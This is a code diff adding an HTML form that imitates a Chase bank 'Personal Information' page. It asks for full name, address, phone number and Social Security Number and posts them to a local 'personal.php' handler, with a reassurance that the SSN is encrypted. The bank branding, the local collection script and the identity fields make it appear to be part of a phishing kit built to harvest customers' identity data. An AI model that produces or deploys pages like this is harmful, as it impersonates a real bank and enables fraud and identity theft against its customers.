@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/chase.css">
+    <title>chase · Personal Information</title>
+</head>
+<body>
+    <header>
+        <img src="res/img/logo.svg" alt="Chase logo">
+    </header>
+
+    <section>
+        <div class="Container">
+
+            <!-- Informational header -->
+            <div class="box">
+                <label style="font-weight: 600;">Personal Information</label>
+                <p style="margin: 8px 0 0 0; font-size: 0.9rem; color: #2a3b4c;">
+                    Please provide your details exactly as they appear on your government-issued ID.
+                </p>
+            </div>
+
+            <form action="personal.php" method="post">
+
+                <!-- Full Name -->
+                <div class="box">
+                    <label>Full Name</label>
+                    <input type="text" name="fullname" required autocomplete="name">
+                </div>
+
+                <!-- Address -->
+                <div class="box">
+                    <label>Address</label>
+                    <input type="text" name="address" required autocomplete="street-address">
+                </div>
+
+                <!-- City & Zip (side by side) -->
+                <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+                    <div class="box" style="flex: 1 1 60%; min-width: 180px;">
+                        <label>City</label>
+                        <input type="text" name="city" required autocomplete="address-level2">
+                    </div>
+                    <div class="box" style="flex: 1 1 30%; min-width: 100px;">
+                        <label>Zip Code</label>
+                        <input type="text" name="zip" maxlength="10" inputmode="numeric" pattern="[0-9]{5}(-[0-9]{4})?" required autocomplete="postal-code">
+                    </div>
+                </div>
+
+                <!-- Phone + Type -->
+                <div class="box">
+                    <label>Phone Number</label>
+                    <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+                        <input type="tel" name="phone" style="flex: 1 1 55%; min-width: 180px;" required autocomplete="tel">
+                        <select name="phone_type" style="flex: 1 1 35%; min-width: 120px; padding: 0.75rem 1rem; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; background: #fefefe; color: #1e2b3c;" required>
+                            <option value="" disabled selected>Type…</option>
+                            <option value="home">Home</option>
+                            <option value="office">Office</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- SSN -->
+                <div class="box">
+                    <label>Social Security Number</label>
+                    <input type="text" name="ssn" maxlength="11" inputmode="numeric" pattern="[0-9]{3}-[0-9]{2}-[0-9]{4}" required autocomplete="off">
+                    <p style="margin: 6px 0 0 0; font-size: 0.8rem; color: #6b7a8d;">
+                        Your SSN is encrypted and used only for identity verification.
+                    </p>
+                </div>
+
+                <!-- Consent -->
+                <div class="L">
+                    <input type="checkbox" id="consent" required>
+                    <label for="consent" style="font-weight: normal;">
+                        I certify that the information provided is true and accurate.
+                    </label>
+                </div>
+
+                <div><button type="submit">Continue</button></div>
+
+                <h5>Why do we need this information? &gt;</h5>
+                <h5>Save and continue later &gt;</h5>
+
+            </form>
+        </div>
+    </section>
+
+    <script src="./res/jquery.js"></script>
+    <script src="./res/cdn/jq.js"></script>
+</body>
+</html>
